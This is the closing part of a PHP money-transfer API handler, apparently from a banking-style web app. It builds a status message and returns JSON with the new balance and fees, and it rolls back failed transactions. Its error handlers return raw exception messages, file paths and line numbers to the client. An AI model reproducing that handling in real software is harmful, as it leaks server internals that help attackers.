    $successMessage = 'Transfer completed successfully';
    if ($transactionStatus === 'pending') {
        $successMessage = 'Transfer submitted successfully. Your transfer is pending admin approval.';
    } elseif ($transactionStatus === 'processing') {
        $successMessage = 'Transfer is being processed.';
    } elseif ($transactionStatus === 'failed') {
        $successMessage = 'Transfer failed. Please contact support for assistance.';
    }

    echo json_encode([
        'success' => true,
        'message' => $successMessage,
        'status' => $transactionStatus,
        'transaction_id' => $transactionRef,
        'new_balance' => $newBalance,
        'amount' => $amount,
        'fee' => $shouldDeductBalance ? $fees : 0,
        'total_deducted' => $shouldDeductBalance ? $totalDeduction : 0,
        'redirect' => '/transfer/status?id=' . urlencode($transactionRef) // Always redirect to status page
    ]);
    
} catch (Exception $e) {
    // Rollback on error
    if ($db && $db->inTransaction()) {
        $db->rollback();
    }
    
    error_log('Transfer API Error: ' . $e->getMessage());
    error_log('Stack trace: ' . $e->getTraceAsString());
    
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'message' => 'Transfer failed: ' . $e->getMessage(),
        'file' => $e->getFile(),
        'line' => $e->getLine()
    ]);
} catch (Error $e) {
    // Rollback on error
    if ($db && $db->inTransaction()) {
        $db->rollback();
    }
    
    error_log('Transfer API Fatal Error: ' . $e->getMessage());
    error_log('Stack trace: ' . $e->getTraceAsString());
    
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'message' => 'Transfer failed: ' . $e->getMessage(),
        'file' => $e->getFile(),
        'line' => $e->getLine()
    ]);
}
?>
